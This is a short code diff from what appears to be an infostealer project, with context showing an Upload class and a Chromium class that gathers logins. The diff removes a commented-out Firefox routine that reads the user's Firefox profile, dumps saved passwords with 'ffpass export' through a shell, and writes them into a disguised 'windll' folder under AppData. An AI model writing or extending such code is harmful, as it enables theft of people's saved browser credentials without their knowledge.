@@ -120,30 +120,6 @@ class Upload:
         if self.Colected:
             listData.append("\n")
 
-'''
-class FireFox:
-    def __init__(self):
-        self.Firefox()
-
-    def Firefox(self):
-        try:
-            pathl = environ['USERPROFILE'] + sep + r'AppData\Local'
-            makedirs(rf'{pathl}\windll\Browsers\Firefox', exist_ok=True)
-            mozilla_profile = path.join(getenv('APPDATA'), r'Mozilla\Firefox')
-            mozilla_profile_ini = path.join(mozilla_profile, r'profiles.ini')
-            profile = ConfigParser()
-            profile.read(mozilla_profile_ini)
-            data_path = path.normpath(path.join(mozilla_profile, profile.get('Profile0', 'Path')))
-            subprocesss = Popen("ffpass export -d  " + data_path, shell=True, stdout=PIPE)
-            subprocess_return = subprocesss.stdout.read()
-            passwords = str(subprocess_return)
-            with open(rf'{pathl}\windll\Browsers\Firefox\firefox.txt', "a", encoding="utf-8") as file:
-                file.write(passwords.replace('\\r', '\n'))
-                file.close()
-        except Exception as e:
-            print(e)
-'''
-
 class Chromium:
     def __init__(self):
         global logins
